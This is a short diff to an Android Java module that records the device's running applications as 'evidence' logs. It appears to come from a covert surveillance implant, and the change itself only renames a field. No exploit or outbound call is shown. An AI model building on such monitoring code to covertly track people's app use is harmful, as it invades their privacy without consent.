@@ -11,8 +11,6 @@ package com.android.dvci.module;
 
 import java.util.ArrayList;
 
-import android.app.ActivityManager.RunningAppProcessInfo;
-
 import com.android.dvci.ProcessInfo;
 import com.android.dvci.ProcessStatus;
 import com.android.dvci.auto.Cfg;
@@ -41,12 +39,12 @@ public class ModuleApplication extends BaseModule implements IncrementalLog, Obs
 
 	}
 
-	EvidenceBuilder logIncremental;
+	EvidenceBuilder evidenceIncremental;
 
 	@Override
 	public void actualStart() {
 		// viene creato un file temporaneo di log application, aperto.
-		logIncremental = new EvidenceBuilder(EvidenceType.APPLICATION);
+		evidenceIncremental = new EvidenceBuilder(EvidenceType.APPLICATION);
 		ListenerProcess.self().attach(this);
 	}
 
@@ -54,7 +52,7 @@ public class ModuleApplication extends BaseModule implements IncrementalLog, Obs
 	public void actualStop() {
 		ListenerProcess.self().detach(this);
 		// il log viene chiuso.
-		logIncremental.close();
+		evidenceIncremental.close();
 	}
 
 	public int notification(ProcessInfo process) {
@@ -86,11 +84,11 @@ public class ModuleApplication extends BaseModule implements IncrementalLog, Obs
 		items.add(ByteArray.intToByteArray(EvidenceBuilder.E_DELIMITER));
 
 		if (Cfg.DEBUG) {
-			Check.asserts(logIncremental != null, "null log"); //$NON-NLS-1$
+			Check.asserts(evidenceIncremental != null, "null log"); //$NON-NLS-1$
 		}
 
 		synchronized (this) {
-			logIncremental.write(items);
+			evidenceIncremental.write(items);
 		}
 
 		if (Cfg.DEBUG) {
@@ -102,9 +100,9 @@ public class ModuleApplication extends BaseModule implements IncrementalLog, Obs
 		if (Cfg.DEBUG) {
 			Check.log(TAG + " (resetLog)");
 		}
-		if (logIncremental.hasData()) {
-			logIncremental.close();
-			logIncremental = new EvidenceBuilder(EvidenceType.APPLICATION);
+		if (evidenceIncremental.hasData()) {
+			evidenceIncremental.close();
+			evidenceIncremental = new EvidenceBuilder(EvidenceType.APPLICATION);
 		}
 	}
 
